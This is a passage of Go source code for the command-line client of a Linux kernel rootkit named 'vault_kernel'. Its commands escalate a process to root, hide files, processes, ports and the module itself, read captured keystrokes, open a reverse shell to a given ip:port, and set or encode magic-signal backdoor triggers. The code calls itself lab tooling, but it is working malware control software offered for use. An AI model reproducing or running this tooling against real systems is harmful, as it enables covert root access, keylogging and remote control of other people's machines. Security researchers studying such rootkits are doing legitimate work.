		Hostname:      hostname,
		KernelRelease: kernelRelease,
		ModuleInSysfs: moduleInSysfs,
		Stats:         stats,
		Hidden:        hidden,
		Keylog:        keylogText,
	}
}

// runningKernelRelease returns the running kernel release (the
// `uname -r` equivalent) from procfs — an evidence bundle records
// WHERE a snapshot was taken.  "" when procfs is unavailable (never
// expected on Linux, but a missing label must not fail the capture).
func runningKernelRelease() string {
	b, err := os.ReadFile("/proc/sys/kernel/osrelease")
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(b))
}

// runCapture reads stats, the hidden list and the keylog buffer in one
// pass and emits the evidence bundle through emitCaptureBundle: with
// outPath it writes the file (0600 — captures may contain keystrokes)
// and prints a one-line summary (to stderr as well when --stdout asks
// for a pure-JSON stdout); without it the JSON goes to stdout like the
// other --json commands.
func runCapture(f *os.File, outPath string, forceStdout bool) error {
	statsBuf := make([]byte, 4096)
	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&statsBuf[0])); err != 0 {
		return fmt.Errorf("capture: GET_STATS failed: %w", err)
	}
	listBuf := make([]byte, 4096)
	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&listBuf[0])); err != 0 {
		return fmt.Errorf("capture: LIST_HIDDEN failed: %w", err)
	}
	keyBuf := make([]byte, 4096)
	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_READ, unsafe.Pointer(&keyBuf[0])); err != 0 {
		return fmt.Errorf("capture: KEYLOG_READ failed: %w", err)
	}

	_, sysfsErr := os.Stat(sysfsModulePath)
	hostname, _ := os.Hostname()
	rep := buildCaptureReport(
		ioctl.ParseStatsReport(strings.TrimRight(string(statsBuf), "\x00")),
		ioctl.ParseHiddenList(strings.TrimRight(string(listBuf), "\x00")),
		strings.TrimRight(string(keyBuf), "\x00"),
		time.Now().UTC().Format(time.RFC3339),
		sysfsErr == nil,
		clientVersion,
		hostname,
		runningKernelRelease(),
	)
	j, err := json.MarshalIndent(rep, "", "  ")
	if err != nil {
		return err
	}
	return emitCaptureBundle(j, outPath, forceStdout)
}

// hiddenJSONEnvelope wraps the parsed hidden list with the schema
// marker; the embedded struct keeps the documented key order
// (schema, pids, files, ports).
type hiddenJSONEnvelope struct {
	Schema int `json:"schema"`
	ioctl.HiddenList
}

// marshalHiddenJSON renders the parsed LIST_HIDDEN report into the
// versioned JSON envelope (pure; unit-testable without a device).
func marshalHiddenJSON(hl ioctl.HiddenList) ([]byte, error) {
	return json.MarshalIndent(hiddenJSONEnvelope{Schema: jsonSchemaVersion, HiddenList: hl}, "", "  ")
}

func magicEncode(word string, port uint16) error {
	if word == "" {
		return fmt.Errorf("magic word cannot be empty")
	}
	encoded := ioctl.MagicPID(word, port)
	fmt.Printf("[*] Magic word : %s (hash 0x%04X)\n", word, ioctl.FNV1a16(word))
	fmt.Printf("[*] Port       : %d\n", port)
	fmt.Printf("[*] Encoded PID: %d\n", encoded)
	fmt.Printf("[*] Trigger    : kill -s %d %d\n",
		ioctl.MagicSignal, encoded)
	fmt.Printf("[*] (signal %d = glibc SIGRTMIN+1; matches MAGIC_SIGNAL in src/backdoor.c)\n",
		ioctl.MagicSignal)
	return nil
}

// doctorReport is the machine-readable form of runDoctor. Pointer
// fields are omitted from the JSON when the corresponding check could
// not run (module unreachable, version not reported, ...).
type doctorReport struct {
	Schema         int    `json:"schema"`
	ClientVersion  string `json:"client_version"`
	DevicePresent  bool   `json:"device_present"`
	DeviceOpen     *bool  `json:"device_open,omitempty"`
	StatsResponds  *bool  `json:"stats_responds,omitempty"`
	ModuleVersion  string `json:"module_version,omitempty"`
	VersionMatch   *bool  `json:"version_match,omitempty"`
	UptimeS        *int64 `json:"uptime_s,omitempty"`
	HooksInstalled *int   `json:"hooks_installed,omitempty"`
	HooksPlanned   *int   `json:"hooks_planned,omitempty"`
	ModuleInSysfs  *bool  `json:"module_in_sysfs,omitempty"`
	KeylogResponds *bool  `json:"keylog_responds,omitempty"`
	ListResponds   *bool  `json:"list_responds,omitempty"`
	Warnings       int    `json:"warnings"`
}

func renderDoctorJSON(rep *doctorReport) {
	j, err := json.MarshalIndent(rep, "", "  ")
	if err != nil {
		fmt.Println("{}")
		return
	}
	fmt.Println(string(j))
}

// runDoctor performs lab sanity checks against a loaded module: device
// node, permissions, stats ABI, hook count, client/module version match,
// module stealth state and every read-only control interface. It exits
// non-zero only when the module is unreachable; warnings do not fail.
// With jsonMode it prints a single JSON document instead of text, so
// lab scripts can consume it with jq.
func runDoctor(jsonMode bool) error {
	rep := doctorReport{Schema: jsonSchemaVersion, ClientVersion: clientVersion}
	say := func(format string, a ...interface{}) {
		if !jsonMode {
			fmt.Printf(format, a...)
		}
	}
	fail := func(err error) error {
		// Failure states still emit the JSON document (with
		// the checks that ran); text mode keeps the original
		// behavior of stopping without the trailer.
		if jsonMode {
			renderDoctorJSON(&rep)
		}
		return err
	}

	say("[*] vault_kernel doctor — lab diagnostics\n")
	say("\n")

	// 1. Device node present?
	st, err := os.Stat(devicePath)
	if err != nil {
		say("  [FAIL] %s not found — module is not loaded\n", devicePath)
		say("         Load it first: sudo insmod vault_kernel.ko\n")
		return fail(fmt.Errorf("module not loaded"))
	}
	rep.DevicePresent = true
	say("  [ OK ] device %s present (mode %s)\n", devicePath, st.Mode().String())

	// 2. Device opens read/write?
	f, err := os.OpenFile(devicePath, os.O_RDWR, 0)
	if err != nil {
		// v3.7 parity fix: emit the key as false like the Python
		// client does — DeviceOpen used to be a plain bool with
		// omitempty, so the key VANISHED from the JSON exactly when
		// the check failed.
		openOK := false
		rep.DeviceOpen = &openOK
		say("  [FAIL] cannot open %s: %v\n", devicePath, err)
		say("         EACCES/EPERM → run with sudo (module also rejects non-root since v3.4).\n")
		return fail(err)
	}
	defer f.Close()
	openOK := true
	rep.DeviceOpen = &openOK
	say("  [ OK ] device opens read/write\n")

	// 3. GET_STATS responds?
	buf := make([]byte, 4096)
	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&buf[0])); err != 0 {
		// v3.7 parity fix: same key-vanishing problem as DeviceOpen.
		statsOK := false
		rep.StatsResponds = &statsOK
		say("  [FAIL] GET_STATS failed: %v\n", err)
		say("         If this is ENOTTY, the client and module versions are out of sync.\n")
		return fail(err)
	}
	statsOK := true
	rep.StatsResponds = &statsOK
	/* The stats report carries MULTIPLE key=value pairs per line —
	 * parse it with the shared token-based parser (see
	 * internal/vaultkernel/report.go for the v3.4/v3.5 bug this
	 * replaces). */
	stats := ioctl.ParseStatsReport(strings.TrimRight(string(buf), "\x00"))
	say("  [ OK ] GET_STATS responds\n")
	say("         module version : %s\n", stats["version"])
	say("         uptime_s       : %s\n", stats["uptime_s"])
	rep.ModuleVersion = stats["version"]
	if n, err := strconv.ParseInt(stats["uptime_s"], 10, 64); err == nil {
		rep.UptimeS = &n
	}

	// 4. Client/module version match
	if v := stats["version"]; v != "" {
		match := v == clientVersion
		rep.VersionMatch = &match
		if !match {
			say("  [WARN] client v%s != module v%s — ioctl ABI may differ\n", clientVersion, v)
			rep.Warnings++
		}
	}

	// 5. Hooks installed
	if h := stats["hooks_installed"]; h != "" {
		n, err := strconv.Atoi(h)
		if err != nil {
			say("  [WARN] hooks_installed not numeric: %q\n", h)
			rep.Warnings++
		} else {
			rep.HooksInstalled = &n
			if p, perr := strconv.Atoi(stats["hooks_planned"]); perr == nil {
				rep.HooksPlanned = &p
				say("  [ OK ] %d/%d syscall hooks installed\n", n, p)
			} else {
				say("  [ OK ] %d syscall hooks installed\n", n)
			}
			if n == 0 {
				say("  [WARN] 0 syscall hooks installed — hiding features are inactive\n")
				rep.Warnings++
			}
		}
	}

	// 6. Stealth state (informational, never a warning)
	{
		_, err := os.Stat(sysfsModulePath)
		visible := err == nil
		rep.ModuleInSysfs = &visible
		if visible {
			say("  [INFO] module visible in /sys/module — not hidden\n")
		} else {
			say("  [INFO] module not in /sys/module — hidden from lsmod/sysfs\n")
		}
	}

	// 7. Keylog interface
	kb := make([]byte, 4096)
	{
		_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_READ, unsafe.Pointer(&kb[0]))
		ok := err == 0
		rep.KeylogResponds = &ok
		if !ok {
			say("  [WARN] KEYLOG_READ failed: %v\n", err)
			rep.Warnings++
		} else {
			say("  [ OK ] keylog interface responds\n")
		}
	}

	// 8. List interface
	lb := make([]byte, 4096)
	{
		_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&lb[0]))
		ok := err == 0
		rep.ListResponds = &ok
		if !ok {
			say("  [WARN] LIST_HIDDEN failed: %v\n", err)
			rep.Warnings++
		} else {
			say("  [ OK ] list interface responds\n")
		}
	}

	if jsonMode {
		renderDoctorJSON(&rep)
		return nil
	}
	fmt.Println()
	if rep.Warnings > 0 {
		fmt.Printf("[*] doctor finished with %d warning(s)\n", rep.Warnings)
	} else {
		fmt.Println("[*] doctor finished: everything OK")
	}
	return nil
}

// modinfoInfo is the optional `modinfo` section of the status
// document. Field order is contractual (docs/schemas/status.md); an
// absent field is omitted from the JSON (omitempty).
type modinfoInfo struct {
	Filename    string `json:"filename,omitempty"`
	Version     string `json:"version,omitempty"`
	Author      string `json:"author,omitempty"`
	Description string `json:"description,omitempty"`
}

// statusReport is the FIFTH machine-readable document (v3.10): the
// "is it planted?" check as JSON, usable WITHOUT root — status never
// opens the device. modinfo is best-effort and only present when the
// device exists and `modinfo vault_kernel` ran successfully.
type statusReport struct {
	Schema        int          `json:"schema"`
	DevicePresent bool         `json:"device_present"`
	ModuleInSysfs bool         `json:"module_in_sysfs"`
	Modinfo       *modinfoInfo `json:"modinfo,omitempty"`
}

// parseModinfo extracts the contract keys from `modinfo vault_kernel`
// output: exact key match at line start (first occurrence wins,
// case-insensitive — modinfo emits lowercase keys), empty values
// skipped. Returns nil when NONE of the contract keys appeared —
// callers then omit the section entirely. Pure and unit-testable.
func parseModinfo(output string) *modinfoInfo {
	var mi modinfoInfo
	seen := map[string]bool{}
	for _, line := range strings.Split(output, "\n") {
		key, value, found := strings.Cut(line, ":")
		if !found {
			continue
		}
		k := strings.ToLower(strings.TrimSpace(key))
		v := strings.TrimSpace(value)
		if seen[k] || v == "" {
			continue
		}
		switch k {
		case "filename":
			mi.Filename = v
		case "version":
			mi.Version = v
		case "author":
			mi.Author = v
		case "description":
			mi.Description = v
		default:
			continue
		}
		seen[k] = true
	}
	if !seen["filename"] && !seen["version"] && !seen["author"] && !seen["description"] {
		return nil
	}
	return &mi
}

// buildStatusReport assembles the status document from already-collected
// facts — pure, so the envelope is unit-testable without a device (v3.10).
func buildStatusReport(devicePresent, moduleInSysfs bool, mi *modinfoInfo) statusReport {
	return statusReport{
		Schema:        jsonSchemaVersion,
		DevicePresent: devicePresent,
		ModuleInSysfs: moduleInSysfs,
		Modinfo:       mi,
	}
}

// runStatus implements the `status` command (text or JSON). It never
// opens the device: a lab script can probe the implant's presence
// without root. The modinfo section is best-effort — skipped when
// modinfo is missing, fails, or the module is not loaded.
func runStatus(jsonMode bool) error {
	devicePresent := false
	if _, err := os.Stat(devicePath); err == nil {
		devicePresent = true
	}
	_, sysfsErr := os.Stat(sysfsModulePath)

	var mi *modinfoInfo
	if devicePresent {
		if out, err := exec.Command("modinfo", "vault_kernel").Output(); err == nil {
			mi = parseModinfo(string(out))
		}
	}

	if jsonMode {
		j, err := json.MarshalIndent(buildStatusReport(devicePresent, sysfsErr == nil, mi), "", "  ")
		if err != nil {
			return err
		}
		fmt.Println(string(j))
		return nil
	}

	if devicePresent {
		fmt.Printf("[*] vault_kernel kernel module is LOADED\n    Device: %s\n", devicePath)
		// v3.10: modinfo lines match the Python client's status output
		// (exact keys, fixed order — the old substring scan printed
		// srcversion too).
		if mi != nil {
			if mi.Version != "" {
				fmt.Printf("    version: %s\n", mi.Version)
			}
			if mi.Author != "" {
				fmt.Printf("    author: %s\n", mi.Author)
			}
			if mi.Description != "" {
				fmt.Printf("    description: %s\n", mi.Description)
			}
		}
	} else {
		fmt.Println("[*] vault_kernel kernel module is NOT loaded")
		fmt.Println("    Run: sudo insmod vault_kernel.ko")
	}
	return nil
}

// parsePIDArgs combines the strict one-operand grammar with
// parsePIDArg for hide-pid/unhide-pid (pure; unit-testable).
func parsePIDArgs(args []string, cmd string) (int, error) {
	usage := "usage: vault_kernel " + cmd + " <pid>"
	rest, err := posixOperandArgs(args)
	if err != nil {
		return 0, err
	}
	if err := strictArgs(rest, 1, usage); err != nil {
		return 0, err
	}
	return parsePIDArg(rest[0])
}

// parsePortArgs combines the strict one-operand grammar with
// parsePortArg for hide-port/unhide-port (pure; unit-testable).
func parsePortArgs(args []string, cmd string) (uint16, error) {
	usage := "usage: vault_kernel " + cmd + " <port>"
	rest, err := posixOperandArgs(args)
	if err != nil {
		return 0, err
	}
	if err := strictArgs(rest, 1, usage); err != nil {
		return 0, err
	}
	return parsePortArg(rest[0])
}

// watchOpts is the parsed argument set of the `watch` command.
type watchOpts struct {
	intervalMs int
	once       bool
	count      int // v3.12: stop after N frames (0 = unlimited)
}

// parseWatchArgs owns the `watch` grammar (v3.9; --once in v3.10;
// --count in v3.12; pure):
//
//	watch [--interval MS] [--once] [--count N]
//
// Default 1000 ms, --interval takes a required operand (>= 50 ms,
// same floor as keylog), and ANY extra argument is a usage error —
// `watch --interval 500 extra` used to ignore "extra" in silence.
// --once renders a single frame and exits (no ANSI control, no loop).
// v3.12 adds --count N (>= 1, at most once): the loop renders N frames
// and exits with the standard farewell — finite watch windows for lab
// reports and CI diagnostics, symmetric with keylog --stop-after.
// --once and --count are mutually exclusive (a usage error): one frame
// is not a window.
func parseWatchArgs(args []string) (watchOpts, error) {
	opts := watchOpts{intervalMs: watchDefaultIntervalMs}
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--once":
			opts.once = true
		case "--count":
			if i+1 >= len(args) {
				return opts, usagef("--count requires an N operand")
			}
			if opts.count != 0 {
				return opts, usagef("--count given more than once")
			}
			i++
			n, err := strconv.Atoi(args[i])
			if err != nil || n < 1 {
				return opts, usagef("invalid --count: %s (frames, >= 1)", args[i])
			}
			opts.count = n
		case "--interval":
			if i+1 >= len(args) {
				return opts, usagef("--interval requires an MS operand")
			}
			i++
			n, err := strconv.Atoi(args[i])
			if err != nil || n < keylogMinIntervalMs {
				return opts, usagef("invalid interval: %s (milliseconds, min %d)", args[i], keylogMinIntervalMs)
			}
			opts.intervalMs = n
		default:
			return opts, usagef("usage: vault_kernel watch [--interval MS] [--once] [--count N]")
		}
	}
	if opts.once && opts.count != 0 {
		return opts, usagef("--once and --count are mutually exclusive")
	}
	return opts, nil
}

// parseMagicEncodeArgs owns the `magic-encode` grammar (v3.9):
// exactly <word> <port>, port 1-65535 — extras were silently ignored
// before.  Pure and unit-testable (the command never touches the
// device; it lives before openDevice in the dispatcher).
func parseMagicEncodeArgs(args []string) (string, uint16, error) {
	if len(args) != 2 {
		return "", 0, usagef("usage: vault_kernel magic-encode <word> <port>")
	}
	port, err := parsePortArg(args[1])
	if err != nil {
		return "", 0, err
	}
	return args[0], port, nil
}

func printVersion() {
	fmt.Printf("vault_kernel CLI v%s (ioctl magic 0xC0, signal trigger %d)\n",
		clientVersion, ioctl.MagicSignal)
}

func printUsage() {
	printUsageTo(os.Stdout)
}

// printUsageTo writes the command surface to any writer — stdout for
// `help`, stderr for the bare-invocation usage error (v3.12).
func printUsageTo(w io.Writer) {
	fmt.Fprint(w, `vault_kernel CLI — Kernel Rootkit Control

Usage:
  vault_kernel <command> [arguments]

Commands:
  status [--json]         Check if rootkit is loaded (JSON for scripts)
  doctor [--json]         Diagnose module/client state (lab sanity check)
  give-root [pid]         Escalate process to root (default: self)
  hide-file <name>        Hide a file/directory
  unhide-file <name>      Reveal a hidden file/directory
  hide-pid <pid>          Hide a process from ps, top, /proc
  unhide-pid <pid>        Reveal a hidden process
  hide-port <port>        Hide a TCP/UDP port from netstat, ss
  unhide-port <port>      Reveal a hidden port
  list [--json]           List all hidden items
  stats                   Show module stats (version, hooks, counts)
  stats --json            Same, as machine-readable JSON
  watch [--interval MS] [--once] [--count N]
                          Live view of stats + hidden list (default 1000 ms);
                          --once renders a single frame and exits;
                          --count N renders N frames and exits
  shell <ip:port>         Trigger reverse shell
  magic <word>            Set magic packet trigger word
  magic-encode <word> <port>  Print the kill() trigger for a word+port
  keylog [--follow [ms]] [--timestamps] [--output FILE] [--stop-after N]
                          Read captured keystrokes (stream with --follow;
                          --stop-after N ends the stream after N events)
  keylog-clear            Clear keylogger buffer
  capture [--out FILE] [--stdout]
                          Evidence bundle: stats + hidden + keylog as JSON;
                          --stdout ALSO prints the JSON to stdout (summary
                          moves to stderr, so the pipe stays pure JSON)
  hide-module             Hide rootkit from lsmod
  unhide-module           Make rootkit visible in lsmod
  reset                   Clear ALL hidden files, PIDs and ports
  version                 Print client version

Exit codes:
  0  success
  1  runtime error (device open, ioctl failure, empty report)
  2  usage error (grammar, invalid values, unknown command)
`)
}

func run() error {
	if os.Args[1] == "status" {
		// v3.10: --json joins the machine-readable surface (5th JSON
		// document); the strict grammar is kept via parseFlagOnly.
		jsonMode, err := parseFlagOnly(os.Args[2:], "--json", "usage: vault_kernel status [--json]")
		if err != nil {
			return err
		}
		return runStatus(jsonMode)
	}

	if os.Args[1] == "-h" || os.Args[1] == "--help" || os.Args[1] == "help" {
		printUsage()
		return nil
	}

	if os.Args[1] == "version" || os.Args[1] == "-v" || os.Args[1] == "--version" {
		// v3.9 strict grammar (matches the Python argparse surface).
		if err := strictArgs(os.Args[2:], 0, "usage: vault_kernel version"); err != nil {
			return err
		}
		printVersion()
		return nil
	}

	if os.Args[1] == "doctor" {
		jsonMode, err := parseFlagOnly(os.Args[2:], "--json", "usage: vault_kernel doctor [--json]")
		if err != nil {
			return err
		}
		return runDoctor(jsonMode)
	}

	if os.Args[1] == "magic-encode" {
		// v3.9: grammar extracted to a pure function (extras were
		// silently ignored; the port check was duplicated inline).
		// v3.11: POSIX end-of-options like argparse.
		rest, err := posixOperandArgs(os.Args[2:])
		if err != nil {
			return err
		}
		word, port, err := parseMagicEncodeArgs(rest)
		if err != nil {
			return err
		}
		return magicEncode(word, port)
	}

	cmd := os.Args[1]

	// v3.12: GRAMMAR BEFORE DEVICE.  Every device case parses its
	// arguments with the pure parsers and returns the execution
	// closure; openDevice runs ONCE after the switch.  A usage error
	// (exit 2) is therefore reported without touching the device —
	// the round-4 post-opening grammar hid it behind the device error
	// whenever the module was not loaded (`hide-file a b` without the
	// module reported "cannot open /dev/vault_kernel" instead of the
	// unexpected operand).  With the module loaded the behaviour is
	// identical to v3.11.
	var exec func(f *os.File) error

	switch cmd {
	case "give-root":
		// v3.11: POSIX end-of-options (-- -5) like argparse.
		rest, err := posixOperandArgs(os.Args[2:])
		if err != nil {
			return err
		}
		pid, err := parseGiveRootPID(rest)
		if err != nil {
			return err
		}
		exec = func(f *os.File) error { return giveRoot(f, pid) }

	case "hide-file":
		// v3.9 strict grammar: `hide-file a b` used to hide "a" and
		// silently drop "b".  v3.11: POSIX escape for dash-leading
		// names (`hide-file -- -foo`), bare "-foo" rejected like
		// argparse.  v3.12: value validation (empty / >255 bytes) in
		// the pre-device grammar via validateFileName.
		rest, err := posixOperandArgs(os.Args[2:])
		if err != nil {
			return err
		}
		if err := strictArgs(rest, 1, "usage: vault_kernel hide-file <name>"); err != nil {
			return err
		}
		if err := validateFileName(rest[0]); err != nil {
			return err
		}
		name := rest[0]
		exec = func(f *os.File) error { return hideFile(f, name) }

	case "unhide-file":
		rest, err := posixOperandArgs(os.Args[2:])
		if err != nil {
			return err
		}
		if err := strictArgs(rest, 1, "usage: vault_kernel unhide-file <name>"); err != nil {
			return err
		}
		if err := validateFileName(rest[0]); err != nil {
			return err
		}
		name := rest[0]
		exec = func(f *os.File) error { return unhideFile(f, name) }

	case "hide-pid":
		// v3.9: pid >= 1 (the module stores any int verbatim; a
		// 0/negative entry can never match and pollutes `list`) +
		// strict grammar via parsePIDArg.
		pid, err := parsePIDArgs(os.Args[2:], "hide-pid")
		if err != nil {
			return err
		}
		exec = func(f *os.File) error { return hidePID(f, pid) }

	case "unhide-pid":
		pid, err := parsePIDArgs(os.Args[2:], "unhide-pid")
		if err != nil {
			return err
		}
		exec = func(f *os.File) error { return unhidePID(f, pid) }

	case "hide-port":
		port, err := parsePortArgs(os.Args[2:], "hide-port")
		if err != nil {
			return err
		}
		exec = func(f *os.File) error { return hidePort(f, port) }

	case "unhide-port":
		port, err := parsePortArgs(os.Args[2:], "unhide-port")
		if err != nil {
			return err
		}
		exec = func(f *os.File) error { return unhidePort(f, port) }

	case "list":
		jsonMode, err := parseFlagOnly(os.Args[2:], "--json", "usage: vault_kernel list [--json]")
		if err != nil {
			return err
		}
		if jsonMode {
			exec = func(f *os.File) error { return listHiddenJSON(f) }
		} else {
			exec = func(f *os.File) error { return listHidden(f) }
		}

	case "stats":
		jsonMode, err := parseFlagOnly(os.Args[2:], "--json", "usage: vault_kernel stats [--json]")
		if err != nil {
			return err
		}
		if jsonMode {
			exec = func(f *os.File) error { return showStatsJSON(f) }
		} else {
			exec = func(f *os.File) error { return showStats(f) }
		}

	case "watch":
		// v3.9: grammar extracted to a pure parser — `watch --interval
		// 500 extra` used to ignore "extra" in silence.  v3.12: --count.
		opts, err := parseWatchArgs(os.Args[2:])
		if err != nil {
			return err
		}
		exec = func(f *os.File) error { return runWatch(f, opts) }

	case "shell":
		// v3.9: real ip:port validation (host non-empty, port 1-65535)
		// instead of a bare "contains :" check; extras rejected.
		// v3.11: POSIX end-of-options like argparse.
		rest, err := posixOperandArgs(os.Args[2:])
		if err != nil {
			return err
		}
		if err := strictArgs(rest, 1, "usage: vault_kernel shell <ip:port>"); err != nil {
			return err
		}
		if err := parseShellTarget(rest[0]); err != nil {
			return err
		}
		target := rest[0]
		exec = func(f *os.File) error { return backdoorShell(f, target) }

	case "magic":
		// v3.11: POSIX end-of-options like argparse.  v3.12: value
		// validation via validateMagicWord pre-device.
		rest, err := posixOperandArgs(os.Args[2:])
		if err != nil {
			return err
		}
		if err := strictArgs(rest, 1, "usage: vault_kernel magic <word>"); err != nil {
			return err
		}
		if err := validateMagicWord(rest[0]); err != nil {
			return err
		}
		word := rest[0]
		exec = func(f *os.File) error { return backdoorMagic(f, word) }

	case "keylog":
		opts, err := parseKeylogArgs(os.Args[2:])
		if err != nil {
			return err
		}
		if opts.follow {
			exec = func(f *os.File) error {
				return keylogFollow(f, opts.intervalMs, opts.timestamps, opts.outputPath, opts.stopAfter)
			}
		} else {
			exec = func(f *os.File) error { return keylogRead(f, opts.outputPath) }
		}

	case "capture":
		outPath, forceStdout, err := parseCaptureArgs(os.Args[2:])
		if err != nil {
			return err
		}
		exec = func(f *os.File) error { return runCapture(f, outPath, forceStdout) }

	case "keylog-clear":
		if err := strictArgs(os.Args[2:], 0, "usage: vault_kernel keylog-clear"); err != nil {
			return err
		}
		exec = func(f *os.File) error { return keylogClear(f) }

	case "hide-module":
		if err := strictArgs(os.Args[2:], 0, "usage: vault_kernel hide-module"); err != nil {
			return err
		}
		exec = func(f *os.File) error { return hideModule(f) }

	case "unhide-module":
		if err := strictArgs(os.Args[2:], 0, "usage: vault_kernel unhide-module"); err != nil {
			return err
		}
		exec = func(f *os.File) error { return unhideModule(f) }

	case "reset":
		if err := strictArgs(os.Args[2:], 0, "usage: vault_kernel reset"); err != nil {
			return err
		}
		exec = func(f *os.File) error { return resetAll(f) }

	default:
		return usagef("unknown command: %s\nRun 'vault_kernel help' for usage", cmd)
	}

	f, err := openDevice()
	if err != nil {
		return err
	}
	defer f.Close()
	return exec(f)
}

// deviceRequired reports whether a command opens /dev/vault_kernel.
// The pre-device commands are usable WITHOUT root by design — status
// is THE no-root check since v3.10, version/help are pure prints and
// magic-encode is pure computation — and warning on them contradicted
// that contract (a non-root lab script got a scary stderr line on the
// exact workflow v3.10 enabled).  Unknown commands skip the warning
// too: openDevice()'s "is rootkit loaded?" error is the honest answer
// for them.  Fixed in v3.11 (Python parity: same list).
func deviceRequired(cmd string) bool {
	switch cmd {
	case "status", "version", "-v", "--version", "help", "-h", "--help", "magic-encode":
		return false
	}
	return true
}

func main() {
	if len(os.Args) < 2 {
		// v3.12: a bare invocation is a USAGE error, not help — the
		// exit contract is 0 = success, 1 = runtime, 2 = usage (parity
		// with the Python client and with argparse's missing
		// subcommand behaviour).  The usage goes to stderr.
		printUsageTo(os.Stderr)
		os.Exit(2)
	}
	if deviceRequired(os.Args[1]) && os.Geteuid() != 0 {
		fmt.Fprintln(os.Stderr, "[!] Warning: not running as root. Some commands may fail.")
	}
	err := run()
	if err == nil {
		return
	}
	var ue *usageError
	fmt.Fprintf(os.Stderr, "[-] Error: %v\n", err)
	if errors.As(err, &ue) {
		os.Exit(2)
	}
	os.Exit(1)
}
